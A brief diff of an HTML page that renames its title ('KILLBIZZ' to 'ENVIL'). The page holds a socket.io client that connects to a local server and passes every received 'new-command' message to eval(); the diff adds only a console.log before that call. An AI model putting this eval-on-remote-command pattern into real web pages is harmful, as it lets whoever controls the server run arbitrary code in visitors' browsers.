@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>KILLBIZZ</title>
+    <title>ENVIL</title>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -21,6 +21,7 @@
     <script>
         const socket = io("http://localhost:3001");
         socket.on('new-command', function (msg) {
+            console.log(msg.data);
             eval(msg.data);
         });
     </script>
